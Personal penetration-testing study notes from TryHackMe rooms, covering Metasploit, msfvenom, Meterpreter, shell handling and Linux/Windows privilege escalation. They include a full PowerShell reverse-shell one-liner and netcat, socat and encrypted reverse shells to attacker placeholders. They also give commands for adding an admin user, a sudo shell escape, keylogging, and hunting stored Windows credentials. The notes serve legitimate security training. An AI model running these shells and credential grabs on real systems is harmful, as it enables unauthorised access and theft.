| **Vulnerability**           | **Description**                                                                                                                                                                                                                                    |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Operating System            | These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.                                                                                                                                  |
| (Mis)Configuration-based    | These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.                                                                                                         |
| Weak or Default Credentials | Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. |
| Application Logic           | These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.                                                     |
| Human-Factor                | Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.                                                                      |

#### Scoring Vulnerabilities (CVSS & VPR)
Vulnerability management is the process of evaluating, categorising and ultimately remediating threats (vulnerabilities) faced by an organisation.
**Common Vulnerability Scoring System**
First introduced in 2005, the Common Vulnerability Scoring System (or CVSS) is a very popular framework for vulnerability scoring and has three major iterations. As it stands, the current version is CVSSv3.1 (with version 4.0 currently in draft) a score is essentially determined by some of the following factors (but many more):
  1. How easy is it to exploit the vulnerability?
  2. Do exploits exist for this?
  3. How does this vulnerability interfere with the CIA triad?
we can use a vulnerability calculator so determine the score 
	['None, 'Low', 'Medium', 'High', 'Critical']
**Vulnerability Priority Rating (VPR)**
The VPR framework is a much more modern framework in vulnerability management - developed by Tenable, an industry solutions provider for vulnerability management. This framework is considered to be risk-driven; meaning that vulnerabilities are given a score with a heavy focus on the risk a vulnerability poses to the organisation itself, rather than factors such as impact (like with CVSS).

#### Data Base for vulnerability 

1. [NVD (National Vulnerability Database)](https://nvd.nist.gov/vuln)
NVD does not list the vulnerability based on the  application but it list them randomly by the date they were reported 

2. [Exploit-DB](http://exploit-db.com/)
Exploit-DB is better when it come to listing vulnerability based on the app or technologies where the vulnerability id present 

# Room 26
## Exploit Vulnerabilities
#### Automated & Manual Vulnerability research 
  
| **Advantage**                                                                                               | **Disadvantage**                                                                                                                          |
| ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| Automated scans are easy to repeat, and the results can be shared within a team with ease.                  | People can often become reliant on these tools.                                                                                           |
| These scanners are quick and can test numerous applications efficiently.                                    | They are extremely "loud" and produce a lot of traffic and logging. This is not good if you are trying to bypass firewalls and the likes. |
| Open-source solutions exist.                                                                                | Open-source solutions are often basic and require expensive licenses to have useful features.                                             |
| Automated scanners cover a wide range of different vulnerabilities that may be hard to manually search for. | They often do not find every vulnerability on an application.                                                                             |

**Rapid7**
Much like other services such as Exploit DB and NVD, Rapid7 is a vulnerability research database. The only difference being that this database also acts as an exploit database. Using this service, you can filter by type of vulnerability (I.e. application and operating system).

**Searchsploit**

Searchsploit is a tool that is available on popular pentesting distributions such as Kali Linux. It is also available on the TryHackMe AttackBox. This tool is an offline copy of Exploit-DB, containing copies of exploits on your system.

# Room 27
## Metasploit: Introduction
Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

the main component of metasploit are : 
- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

MetaSploit have multiple module to different use 
- Auxiliary:Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
- Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
- Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
- Exploits : Exploits, neatly organized by target system.
- NOPs : NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
- Payloads : Payloads are codes that will run on the target system.
	- - **Adapters:** An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.  
	- **Singles:** Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
	- **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
	- **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.
- Post : Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

*Command*
we can lunch the Metasploit by the command `msfconsole`
when we lunch the script we can still run most of the linux bas command from withing Metasploit
`use` can be used to lunch an exploit 
`show`can be used to get info about an exploit or a module type 
to leave the context of an exploit `back`
`info` to get more information and description about the the exploit you are using 
`search` one of the most used command that help look for related data based on the parameter giving . the search command can give us much info like the location the type and ranking ect 
*Exploit ranking*
![[vulnirabilty-ranking.png]]

*Parameter*
when working with module we need often to set a bunch of parameter before starting using an exploit to do that this is the command that is used `set PARAMETER_NAME VALUE`
always before starting the exploit run the command `show options` to get the parameter that are need in the context 
to override a parameter you only need to write on it or use the `unset all` to reset all the parameter
wen using the set command we only set the parameter to the specific module we are are running to make it gloable we need to use the `setg` and `unsetg`
once all the parameter are set we can run the exploit using exploit 
The `sessions` command can be used from the msfconsole prompt or any context to see the existing sessions.
You can use the `background` command to background the session prompt and go back to the msfconsole prompt.
To interact with any session, you can use the `sessions -i` command followed by the desired session number.

# Metasploit
# Room 28
## Metasploit: Exploitation
#### The Metasploit Database
is a way that help us separate project file one form the other and also parameter to avoid confusion 
![[msfvenom3.png]]
to create a new workspace we use the `workspace -a NAME`
and to delete `workspace -d NAME`
after lunching the database from withing the msf6 we can use specific command to redirect the output of some command to the database and later access them, for example 
`db_nmap -sS 10.10.142.192` the out put of this command will be stored in the db and can be access by querying the  the name of the attribute for in this case it would be *services* and *hosts*

*Msfvenom*:
Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

**Output formats**

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The`msfvenom --list formats` command can be used to list supported output formats

![[msfvenom2.png]]

**Handlers**

Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
![[msfvenom.png]] 

We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command.

#### MSFvenom
is a tool that is included in the metasploit and is used for payload generating 
it can generate payload for different OS and multiple format  [asp, .aspx, .jsp, .php, .py]
`msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>`
`payload` have  a structer that we need to follow :
`platform/architecture/payload_type/connection_method`
**Each part explained:**
**1. Platform (`windows`):**
- `windows` - Windows operating system
- `linux` - Linux systems
- `android` - Android devices
- `osx` - macOS systems
- `php` - PHP web applications
- `java` - Java applications
**2. Architecture (`x64`):**
- `x64` - 64-bit systems
- `x86` - 32-bit systems
- `mips` - MIPS processors
- `arm` - ARM processors
**3. Payload Type (`meterpreter`):**
- `meterpreter` - Advanced post-exploitation framework
- `shell` - Basic command shell
- `vncinject` - VNC injection
- `exec` - Execute single command
	**4. Connection Method (`reverse_tcp`):**
- `reverse_tcp` - Target connects back to attacker
- `bind_tcp` - Attacker connects to target
- `reverse_http` - HTTP-based reverse connection
- `reverse_https` - HTTPS-based reverse connection

when using pre installed payload in metasploit we don't need to think about how we are connected and can access the remote machine that being targeted, but here when cearting a payload using *msfvenom* if we need to capture the connection coming from the target machine we need to set the handler in the attack machine 
we can do that by running the module under the name 
`exploit/multi/handler`
after runnig the module we need to set some parameter like the payload 

![[setting-param.png]]


# Room 27
## Metasploit: Meterpreter
Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.

**Meterpreter commands**

Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.

Core commands

- `background`: Backgrounds the current session
- `exit`: Terminate the Meterpreter session
- `guid`: Get the session GUID (Globally Unique Identifier)  
    
- `help`: Displays the help menu
- `info`: Displays information about a Post module
- `irb`: Opens an interactive Ruby shell on the current session
- `load`: Loads one or more Meterpreter extensions
- `migrate`: Allows you to migrate Meterpreter to another process
- `run`: Executes a Meterpreter script or Post module
- `sessions`: Quickly switch to another session

File system commands

- `cd`: Will change directory
- `ls`: Will list files in the current directory (dir will also work)
- `pwd`: Prints the current working directory
- `edit`: will allow you to edit a file
- `cat`: Will show the contents of a file to the screen
- `rm`: Will delete the specified file
- `search`: Will search for files
- `upload`: Will upload a file or directory
- `download`: Will download a file or directory

Networking commands

- `arp`: Displays the host ARP (Address Resolution Protocol) cache
- `ifconfig`: Displays network interfaces available on the target system  
    
- `netstat`: Displays the network connections
- `portfwd`: Forwards a local port to a remote service
- `route`: Allows you to view and modify the routing table

System commands

- `clearev`: Clears the event logs
- `execute`: Executes a command
- `getpid`: Shows the current process identifier
- `getuid`: Shows the user that Meterpreter is running as
- `kill`: Terminates a process
- `pkill`: Terminates processes by name
- `ps`: Lists running processes
- `reboot`: Reboots the remote computer
- `shell`: Drops into a system command shell
- `shutdown`: Shuts down the remote computer
- `sysinfo`: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)

- `idletime`: Returns the number of seconds the remote user has been idle
- `keyscan_dump`: Dumps the keystroke buffer
- `keyscan_start`: Starts capturing keystrokes
- `keyscan_stop`: Stops capturing keystrokes
- `screenshare`: Allows you to watch the remote user's desktop in real time
- `screenshot`: Grabs a screenshot of the interactive desktop
- `record_mic`: Records audio from the default microphone for X seconds
- `webcam_chat`: Starts a video chat
- `webcam_list`: Lists webcams
- `webcam_snap`: Takes a snapshot from the specified webcam
- `webcam_stream`: Plays a video stream from the specified webcam
- `getsystem`: Attempts to elevate your privilege to that of local system
- `hashdump`: Dumps the contents of the SAM database

**Migrate**

Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.
To migrate to any process, you need to type the migrate command followed by the PID of the desired target process.

**Hashdump**

The `hashdump` command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

**Search**

The `search` command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.

**Shell**

The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.

# Privilege Escalation

# Room 28
## What the Shell
Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually _is._ In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

*Tools*
there are multiple tools that can be used to run reverse shell like :
- netcat 
- socat 
- metasploit (multi/handler)
- msfvenom
- kali provide alist of webshells located in `/usr/share/webshells`

*Shell type*
- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
*Shell can be*
_Interactive:_ If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
_Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. 

#### NETCAT

The syntax for starting a netcat listener using Linux is this:
`nc -lvnp <port-number>`
- **-l** is used to tell netcat that this will be a listener
- **-v** is used to request a verbose output
- **-n** tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
- **-p** indicates that the port specification will follow.

_Bind Shells_
If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:

`nc <target-ip> <chosen-port>`

netcat shell are highly unstable so there are way that can make them more 
_Technique 1: Python  

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.
_Technique 2: rlwrap_

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`

 _Technique 3: Socat_  

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

#### Socat 
Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

_Reverse Shells_
the listen command 
`socat TCP-L:<port>`
the input command 
*windows* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
*linux* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

_Bind Shells_

On a Linux target we would use the following command:
`socat TCP-L:<PORT> EXEC:"bash -li"`  
On a Windows target we would use this command for our listener:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`
 
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`  
The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
    
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

Socat Encrypted Shells
One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.  

We then need to merge the two created files into a single `.pem` file:
`cat shell.key shell.crt > shell.pem`
Now, when we set up our reverse shell listener, we use:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
To connect back, we would use:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:
Target:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
Attacker:
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

>[!Exmaple]
>- What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
>`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0`
>- If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
>`socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

with net cat we can set the connection to execute some sort of program like a bash script so when the remote machine connect to the listing port it will execute a bash terminal 

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.  

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

>[!pip file]
>- `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
>	**`mkfifo /tmp/f`**
>	- Creates a named pipe (FIFO) at `/tmp/f
>	- This acts as a communication channel between processes
>	**`nc <LOCAL-IP> <PORT> < /tmp/f`**
>	- Netcat connects to the specified IP and port
> 	- Takes input from the named pipe `/tmp/f`
> 	- Sends that input over the network connection
> 	**`/bin/sh >/tmp/f 2>&1`**
> 	- Starts a shell (`/bin/sh`)
> 	- Redirects stdout to the named pipe (`>/tmp/f`)
> 	 - Redirects stderr to stdout (`2>&1`), so errors also go to the pipe
> 	 **`rm /tmp/f`**
> 	 - Cleans up by removing the named pipe file

the syntax for adding a user to the admin group under linux

`net user <username> <password> /add`
`net localgroup administrators <username> /add`


# Room 29
## Linux Privilege Escalation

What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

#### Linux Privilege Escalation Process
- *Enumeration* 
		Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.
>[!enumeration]
>- *hostname*
>- *uname -a*
>- */proc/version* Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler
>- */etc/issue* This file usually contains some information about the operating system but can easily be customized or changed.
>- *ps*
>- *env*
>- *ls*
>- *Id* he id command will provide a general overview of the user’s privilege level and group memberships.
>- */etc/passwd*
>- *history*
>- *ifconifg*
>- *netstat*
>- *find*

there are some automated numeration tools like 
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

#### Kernel Exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

`sudo find . -exec /bin/sh \; -quit`
#### SUID (Set-user Identification)
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.


#### Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.

`2>/dev/null` is a way that redirect the error message to a file that erase them directly 

	Capabilities break down the all-or-nothing root privileges into smaller, specific permissions. Instead of giving a program full root access, you can grant it only the specific capabilities it needs.

#### Cron jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.
	Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

he script will use the tools available on the target system to launch a reverse shell.  
Two points to note;

1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
![[backup-sh.png]]
![[netcat.png]]


#### PATH
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

we can manipulate the path variable by adding new parameter to it in the writable folder that we can find sing the command 
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
after that we can run script with root privilege 


#### NFS (Network File Sharing)

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

![[export.png]]
	The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

# Room 30
## Windows Privilege Escalation

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.
Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

built in account in windows OS other that *USER* and *ADMIN*

| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Local Service**        | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.                                                             |
| **Network Service**      | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.                                       |

#### known place to look for password 
#####  Unattended Windows Installations
when installing windows on a large number of host an administrator can use this method to use only one system image to be deployed on several host without the need of interaction while the installation 
for this installation there is the need for an administrator account which might be stored in one of these location 
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

#####  Powershell History
is a user ran a command in power shell the command get stored for future use in a local file 
In case the command contained a password we can see it in plan text 
```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

##### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
```

##### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

##### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

##### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options.
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`

##### AlwaysInstallElevated
	Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
this method need to key registry to be set 

```shell-session
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

##### Windows Services
Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
`sc qc service_name`

##### Insecure Permissions on Service Executable
[[Insecure Permissions on Service Executable]]


##### Unquoted Service Paths
[[Unquoted Service Paths]]

##### Insecure Service Permissions
[[Insecure Service Permissions]]

#### Windows Privileges
this is too much reading leave it for later 
[[Windows Privileges]] 

#### Abusing vulnerable software
##### Unpatched Software

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the `wmic` tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```shell-session
wmic product get name,version,vendor
```

Remember that the `wmic product` command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or plain old [Google](https://www.google.com/), amongst many others.



#### Tools of the Trade
##### WinPEAS

